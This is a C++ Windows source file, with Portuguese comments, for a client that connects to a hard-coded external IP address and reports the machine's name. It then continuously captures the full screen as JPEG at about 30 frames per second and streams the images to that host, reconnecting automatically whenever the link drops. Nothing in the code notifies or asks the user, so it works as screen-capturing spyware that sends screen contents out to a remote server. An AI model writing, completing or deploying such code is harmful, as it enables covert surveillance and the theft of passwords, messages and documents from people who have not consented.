#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <thread>
#include <windows.h>
#include <gdiplus.h>
#include <vector>
#include <atomic>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")

using namespace Gdiplus;

ULONG_PTR gdiplusToken;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
void sendScreenshot(SOCKET sock, std::atomic<bool>& running);
bool keepAlive(SOCKET sock);
void reconnect(SOCKET& sock, const sockaddr_in& server, std::atomic<bool>& running, std::thread& screenshotThread);

int main() {
    // Inicializa GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Inicializa WinSock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    int wsOk = WSAStartup(ver, &wsData);

    if (wsOk != 0) {
        std::cerr << "Não foi possível inicializar o WinSock! Err #" << wsOk << std::endl;
        return 1;
    }

    // Cria o socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Não foi possível criar o socket! Err #" << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Preenche a estrutura do servidor
    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(12345);
    inet_pton(AF_INET, "4.228.228.55", &server.sin_addr);

    // Conecta ao servidor
    int connResult = connect(sock, (sockaddr*)&server, sizeof(server));
    if (connResult == SOCKET_ERROR) {
        std::cerr << "Não foi possível conectar ao servidor! Err #" << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Obtém o nome do computador
    char computerName[256];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    // Envia o nome do computador
    send(sock, computerName, strlen(computerName) + 1, 0); // Inclui o terminador nulo

    std::atomic<bool> running(true);

    // Inicia o envio das screenshots
    std::thread screenshotThread(sendScreenshot, sock, std::ref(running));

    // Inicia a verificação do keep-alive
    std::thread([&sock, &server, &running, &screenshotThread]() {
        while (true) {
            if (!keepAlive(sock)) {
                reconnect(sock, server, running, screenshotThread);
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }).detach();

    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    // Sinaliza para parar a thread de screenshots
    running.store(false);
    screenshotThread.join();

    // Fecha o socket
    closesocket(sock);
    WSACleanup();
    GdiplusShutdown(gdiplusToken);

    return 0;
}

// Função auxiliar para obter CLSID do codec
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;          // Número de image encoders
    UINT size = 0;         // Tamanho da array dos image encoders

    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;  // Falha

    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;  // Falha

    GetImageEncoders(num, size, pImageCodecInfo);
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Sucesso
        }
    }
    free(pImageCodecInfo);
    return -1;  // Falha
}

void sendScreenshot(SOCKET sock, std::atomic<bool>& running) {
    while (running.load()) {
        // Captura a tela
        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

        int width = GetDeviceCaps(hScreenDC, HORZRES);
        int height = GetDeviceCaps(hScreenDC, VERTRES);

        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        SelectObject(hMemoryDC, hOldBitmap);

        BITMAP bitmap;
        GetObject(hBitmap, sizeof(bitmap), &bitmap);

        CLSID clsid;
        GetEncoderClsid(L"image/jpeg", &clsid);

        IStream* istream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &istream);

        Bitmap* bmp = new Bitmap(hBitmap, NULL);
        bmp->Save(istream, &clsid, NULL);

        // Converte para buffer
        STATSTG statstg;
        istream->Stat(&statstg, STATFLAG_DEFAULT);
        ULONG len = statstg.cbSize.LowPart;

        HGLOBAL hGlobal;
        GetHGlobalFromStream(istream, &hGlobal);
        void* buffer = GlobalLock(hGlobal);

        std::vector<char> dataBuffer(len);
        memcpy(dataBuffer.data(), buffer, len);
        GlobalUnlock(hGlobal);

        // Adiciona cabeçalho indicando o tamanho do buffer
        int dataSize = dataBuffer.size();
        send(sock, reinterpret_cast<const char*>(&dataSize), sizeof(dataSize), 0);
        send(sock, reinterpret_cast<const char*>(dataBuffer.data()), dataBuffer.size(), 0);

        // Libera memória
        istream->Release();
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        delete bmp;

        // Espera um pouco para atingir 30 FPS
        std::this_thread::sleep_for(std::chrono::milliseconds(33));
    }
}

bool keepAlive(SOCKET sock) {
    char buffer;
    int result = recv(sock, &buffer, 1, MSG_PEEK);
    if (result == 0 || (result == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)) {
        return false;
    }
    return true;
}

void reconnect(SOCKET& sock, const sockaddr_in& server, std::atomic<bool>& running, std::thread& screenshotThread) {
    // Para a thread de envio de screenshots
    running.store(false);
    if (screenshotThread.joinable()) {
        screenshotThread.join();
    }

    closesocket(sock);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Não foi possível criar o socket! Err #" << WSAGetLastError() << std::endl;
        WSACleanup();
        return;
    }

    while (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Tentando reconectar ao servidor..." << std::endl;
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    std::cerr << "Reconectado ao servidor com sucesso!" << std::endl;

    // Obtém o nome do computador
    char computerName[256];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    // Envia o nome do computador
    send(sock, computerName, strlen(computerName) + 1, 0); // Inclui o terminador nulo

    // Reinicia a thread de envio de screenshots
    running.store(true);
    screenshotThread = std::thread(sendScreenshot, sock, std::ref(running));
}
